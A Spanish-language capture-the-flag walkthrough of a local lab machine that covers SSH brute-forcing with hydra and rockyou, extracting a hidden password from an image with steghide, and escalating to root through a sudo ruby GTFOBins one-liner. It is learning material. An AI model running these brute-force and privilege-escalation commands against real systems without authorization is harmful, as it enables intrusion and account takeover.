## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web no se puede hacer mucho, lo que si es que hay un nombre de usuario:

User : carlota

```bash
hydra -l carlota -P /usr/share/wordlist/rockyou.txt ssh://172.17.0.2 -t 64 -I
```

Pass : babygirl

## Escalada carlota → oscar

Dentro de /home/carlota hay una imagen. 

La traigo a mi host para analizarla:

```bash
cd /home/carlota/Desktop/fotos/vacaciones
```

```bash
# Desde la máquina victima:
python3 -m http.server 7777

# Desde el host:
wget http://172.17.0.2:7777/imagen.jpg
```

La analizo:

```bash
steghide extract -sf imagen.jpg
# Info:
Enter passphrase: 
wrote extracted data to "secret.txt".
```

El contenido es:

```bash
ZXNsYWNhc2FkZXBpbnlwb24=
```

Es una linea en base64, la decodifico de manera local:

```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
# Info:
eslacasadepinypon
```

Es la contraseña de oscar.

## Escalada oscar → root

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/ruby
```

Gracias GTFO Bins:

```bash
sudo ruby -e 'exec "/bin/bash"'
```

Listo.
